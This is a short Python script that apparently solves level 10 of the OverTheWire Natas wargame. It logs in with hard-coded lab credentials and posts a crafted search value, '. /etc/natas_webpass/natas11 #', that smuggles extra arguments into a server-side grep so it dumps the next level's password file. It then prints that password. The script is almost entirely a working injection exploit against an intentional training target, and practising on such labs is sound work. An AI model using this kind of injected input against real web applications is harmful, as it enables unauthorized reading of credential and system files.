import requests
import re


url = 'http://natas10.natas.labs.overthewire.org/'
auth = requests.auth.HTTPBasicAuth('natas10','nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu')

response = requests.post(url, auth=auth, data={'submit':'submit','needle':'. /etc/natas_webpass/natas11 #'})
password = re.findall('(.*)', response.text)
print(password[41]) # U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

